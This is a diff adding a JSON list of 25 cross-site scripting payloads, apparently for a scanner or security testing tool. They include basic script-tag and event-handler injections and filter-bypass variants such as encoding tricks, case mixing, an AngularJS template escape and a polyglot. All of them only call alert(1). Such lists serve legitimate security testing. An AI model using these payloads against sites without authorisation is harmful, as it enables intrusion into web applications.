@@ -1,0 +1,252 @@
+[
+  {
+    "name": "Basic Script Tag",
+    "category": "XSS",
+    "description": "Classic script injection",
+    "payload": "<script>alert(1)</script>",
+    "tags": [
+      "basic",
+      "reflected"
+    ]
+  },
+  {
+    "name": "IMG onerror",
+    "category": "XSS",
+    "description": "Image tag with onerror event",
+    "payload": "<img src=x onerror=alert(1)>",
+    "tags": [
+      "basic",
+      "dom"
+    ]
+  },
+  {
+    "name": "SVG onload",
+    "category": "XSS",
+    "description": "SVG element onload event",
+    "payload": "<svg onload=alert(1)>",
+    "tags": [
+      "svg",
+      "dom"
+    ]
+  },
+  {
+    "name": "Body onload",
+    "category": "XSS",
+    "description": "Body tag onload event",
+    "payload": "<body onload=alert(1)>",
+    "tags": [
+      "body",
+      "dom"
+    ]
+  },
+  {
+    "name": "Input autofocus onfocus",
+    "category": "XSS",
+    "description": "Input with autofocus and onfocus",
+    "payload": "<input autofocus onfocus=alert(1)>",
+    "tags": [
+      "input",
+      "dom"
+    ]
+  },
+  {
+    "name": "Details ontoggle",
+    "category": "XSS",
+    "description": "Details element with ontoggle",
+    "payload": "<details open ontoggle=alert(1)>",
+    "tags": [
+      "html5",
+      "dom"
+    ]
+  },
+  {
+    "name": "Video onerror",
+    "category": "XSS",
+    "description": "Video element with onerror",
+    "payload": "<video src=1 onerror=alert(1)>",
+    "tags": [
+      "media",
+      "dom"
+    ]
+  },
+  {
+    "name": "Iframe srcdoc",
+    "category": "XSS",
+    "description": "Iframe with srcdoc attribute",
+    "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+    "tags": [
+      "iframe",
+      "dom"
+    ]
+  },
+  {
+    "name": "JavaScript URI",
+    "category": "XSS",
+    "description": "JavaScript protocol URI",
+    "payload": "javascript:alert(1)",
+    "tags": [
+      "uri",
+      "href"
+    ]
+  },
+  {
+    "name": "Double URL Encoded",
+    "category": "XSS",
+    "description": "Double URL encoded script tag",
+    "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+    "tags": [
+      "encoded",
+      "bypass"
+    ]
+  },
+  {
+    "name": "HTML Encoded",
+    "category": "XSS",
+    "description": "HTML entity encoded payload",
+    "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "tags": [
+      "encoded",
+      "bypass"
+    ]
+  },
+  {
+    "name": "Case Variation",
+    "category": "XSS",
+    "description": "Mixed case to bypass filters",
+    "payload": "<ScRiPt>alert(1)</ScRiPt>",
+    "tags": [
+      "bypass",
+      "filter"
+    ]
+  },
+  {
+    "name": "Template Literal No Quotes",
+    "category": "XSS",
+    "description": "XSS without quotes using template literal",
+    "payload": "<img src=x onerror=alert`1`>",
+    "tags": [
+      "bypass",
+      "template-literal"
+    ]
+  },
+  {
+    "name": "Unicode Escape",
+    "category": "XSS",
+    "description": "Unicode escaped payload",
+    "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "tags": [
+      "unicode",
+      "bypass"
+    ]
+  },
+  {
+    "name": "DOM innerHTML",
+    "category": "XSS",
+    "description": "DOM-based via innerHTML",
+    "payload": "'-alert(1)-'",
+    "tags": [
+      "dom",
+      "reflected"
+    ]
+  },
+  {
+    "name": "AngularJS Template",
+    "category": "XSS",
+    "description": "AngularJS template injection",
+    "payload": "{{constructor.constructor('alert(1)')()}}",
+    "tags": [
+      "angularjs",
+      "template"
+    ]
+  },
+  {
+    "name": "Polyglot XSS",
+    "category": "XSS",
+    "description": "Multi-context polyglot payload",
+    "payload": "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert())//",
+    "tags": [
+      "polyglot",
+      "advanced"
+    ]
+  },
+  {
+    "name": "Marquee onstart",
+    "category": "XSS",
+    "description": "Using less common event handlers",
+    "payload": "<marquee onstart=alert(1)>test</marquee>",
+    "tags": [
+      "bypass",
+      "event"
+    ]
+  },
+  {
+    "name": "Script src data URI",
+    "category": "XSS",
+    "description": "Script tag with data URI",
+    "payload": "<script src=data:,alert(1)></script>",
+    "tags": [
+      "data-uri",
+      "bypass"
+    ]
+  },
+  {
+    "name": "XSS via style (IE)",
+    "category": "XSS",
+    "description": "XSS via CSS expression legacy IE",
+    "payload": "<div style=\"width:expression(alert(1))\">",
+    "tags": [
+      "css",
+      "ie-legacy"
+    ]
+  },
+  {
+    "name": "Attribute Injection",
+    "category": "XSS",
+    "description": "Injection into attribute context",
+    "payload": "\" onmouseover=\"alert(1)",
+    "tags": [
+      "attribute",
+      "reflected"
+    ]
+  },
+  {
+    "name": "href javascript",
+    "category": "XSS",
+    "description": "Anchor href javascript protocol",
+    "payload": "<a href=javascript:alert(1)>click</a>",
+    "tags": [
+      "href",
+      "uri"
+    ]
+  },
+  {
+    "name": "Object data",
+    "category": "XSS",
+    "description": "Object tag with data attribute",
+    "payload": "<object data=javascript:alert(1)>",
+    "tags": [
+      "object",
+      "uri"
+    ]
+  },
+  {
+    "name": "Form action javascript",
+    "category": "XSS",
+    "description": "Form action javascript protocol",
+    "payload": "<form action=javascript:alert(1)><input type=submit>",
+    "tags": [
+      "form",
+      "uri"
+    ]
+  },
+  {
+    "name": "Null Byte Before Protocol",
+    "category": "XSS",
+    "description": "Null byte injection before protocol (text representation)",
+    "payload": "<a href=\"java[NULL]script:alert(1)\">click</a>",
+    "tags": [
+      "null-byte",
+      "bypass"
+    ]
+  }
+]
